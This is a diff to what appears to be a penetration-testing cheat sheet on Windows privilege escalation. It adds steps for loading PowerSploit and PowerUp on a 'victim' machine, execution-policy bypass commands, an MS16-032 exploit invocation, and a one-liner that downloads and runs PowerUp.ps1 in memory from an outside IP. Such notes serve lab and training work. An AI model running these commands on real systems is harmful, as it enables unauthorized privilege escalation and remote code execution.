@@ -1360,16 +1360,13 @@ Handy Kernel Exploits
 
 -   Metasploit Meterpreter Privilege Escalation Guide
     https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/
+        `meterpreter > getsystem`
 
 -   Try the obvious - Maybe the user is SYSTEM or is already part of the Administrator group:  
     
     `whoami` 
-    
     `net user "%username%"`
 
--   Try the getsystem command using meterpreter - rarely works but is worth a try.
-
-    `meterpreter > getsystem`
 
 -   No File Upload Required Windows Privlege Escalation Basic Information Gathering (based on the fuzzy security tutorial and windows_privesc_check.py).
      
@@ -1484,13 +1481,38 @@ http://www.r00tsec.com/2011/09/exploiting-microsoft-iis-version-60.html
     
 -   Powershell Exploits - You may find that some Windows privledge escalation exploits are written in Powershell. You may not have an interactive shell that allows you to enter the powershell prompt.  Once the powershell script is uploaded to the server, here is a quick one liner to run a powershell command from a basic (cmd.exe) shell:
 
-      MS16-032 https://www.exploit-db.com/exploits/39719/
+      MS16-032 https://www.exploit-db.com/exploits/39719/ (requres at least 2 CPU cores )
       
       `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\Public\Invoke-MS16-032.ps1; Invoke-MS16-032 }"`
       
     
 -   Powershell Priv Escalation Tools
-    https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+    https://github.com/PowerShellMafia/PowerSploit
+    
+    Download to victim, unzip
+    `echo $Env:PSModulePath` - to see where to locate folder
+    `mkdir C:\Users\username\Documents\WindowsPowerShell\Modules` - create this folder with
+    Copy PowerSploit and Privesc folder to "C:\Users\username\Documents\WindowsPowerShell\Modules"  
+    `powershell.exe -nop -exec bypass` 
+    cd to PowerSploit folder
+    `Import-Module PowerSploit` -  To use the module, type  Import-Module .\PowerSploit.psd1
+    `Import-Module Privesc` Import-Module PowerUp.ps1
+    `Get-Command -Module PowerSploit` - To see the commands imported, type 
+    `Get-Help Out-Minidump` - To get help  on some command
+    
+    `Invoke-AllChecks -HTMLReport`  
+    
+    Non-Interractive shells:
+    One option is to upload the PowerUp.ps1 script to the machine, drop into a shell, and execute the following command:
+    C:\> `powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”`
+       
+
+    TO invoke everything without touching disk
+
+      C:\Users\lowpriv>`powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.11.0.183/PowerSploit/Privesc/PowerUp.ps1');Get-ServiceUnquoted"`
+   
+        
+    
 
 -   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.
 
